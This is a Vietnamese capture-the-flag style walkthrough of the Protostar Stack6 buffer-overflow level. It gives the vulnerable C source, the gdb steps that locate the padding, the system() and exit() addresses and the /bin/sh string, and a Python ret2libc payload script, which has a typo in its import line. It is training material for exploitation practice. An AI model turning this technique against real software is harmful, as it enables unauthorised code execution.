# protostar-pwn

# Stack6

# Source code


```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

Mk đã có tham khảo và rút ra được 1 vài cách làm như sau

Chú ý đoạn code dưới đây 

```
  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }
```

đoạn code này nhằm mục đích chặn việc chúng ta trả về giá trị trong khoảng 0xbf000000 đến 0xbfffffff
bởi 

```
giả sử ret = 0xbf333333          <<== một giá trị ngẫu nhiên
ret & 0xbf000000== 0xbf000000
do đó kết quả sẽ luôn thu được 0xbf000000
```
Dựa theo gợi ý của đề bài

```
This level can be done in a couple of ways, such as finding the duplicate of the 
payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.

```
Với bài này mình sẽ hướng tới phương pháp ret2libc (bởi nó dễ hiểu)

Bước đầu tiên phải đi tìm lượng padding để overflow vào eip

```
(gdb) disass main
Dump of assembler code for function main:
0x080484fa <main+0>:	push   %ebp
0x080484fb <main+1>:	mov    %esp,%ebp
0x080484fd <main+3>:	and    $0xfffffff0,%esp
0x08048500 <main+6>:	call   0x8048484 <getpath>
0x08048505 <main+11>:	mov    %ebp,%esp
0x08048507 <main+13>:	pop    %ebp
0x08048508 <main+14>:	ret    
End of assembler dump.
(gdb) b *main+14
Breakpoint 1 at 0x8048508: file stack6/stack6.c, line 31.
(gdb) r < /tmp/pay
payloadtmp
(gdb) r < /tmp/payloadtmp
Starting program: /opt/protostar/bin/stack6 < /tmp/payloadtmp
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
(gdb) x/x $ebp
0x54545454:	Cannot access memory at address 0x54545454                 <<==== 'TTTT'

```
Sau đó tìm địa chỉ của >system() và >exit()
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>

```
tiếp đó là tìm /bin/sh
```
$ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
  11f3bf /bin/sh   
 
  -a   = Scan entire file
  -t x = Print the offset location of the string in hexdecimal
```
cuối cùng chúng ta tìm điểm khởi đầu của thư viện /lib/libc-2.11.2.so

```
(gdb) info proc mappings
process 1944
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fde000 0xb7fe2000     0x4000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]
  
```
Cuối cùng là ghép lại thành 1 file payload:

```
mport struct
pd = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT"
sysadd = struct.pack("I",0xb7ecffb0)
exitadd = struct.pack("I",0xb7ec60c0)
binadd = struct.pack("I",0xb7e97000+0x11f3bf)
payload = pd + sysadd + exitadd + binadd
print payload

```



